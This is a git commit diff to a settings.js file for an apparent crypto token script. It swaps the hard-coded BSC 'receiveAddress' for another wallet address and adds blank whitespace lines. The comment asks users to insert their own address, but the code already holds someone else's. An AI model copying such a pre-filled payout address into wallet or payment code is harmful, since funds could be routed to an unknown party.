e12ff9cec708a689ced525c3b2c018ef41b9536d
Wpcoderrs <168964856+Wpcoderrs@users.noreply.github.com>
2024-05-07 08:44:19 +0200

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,8 +1,10 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
-
-	
+const receiveAddress = "0x18df65988E92e3321bbCd633d7C436289D92aBDa";   // remove the words and replace it with your bsc address                                                                                    
+                                  
+                                        
+  
+  
 var cryptotokenContract;
 var smartcontract
 
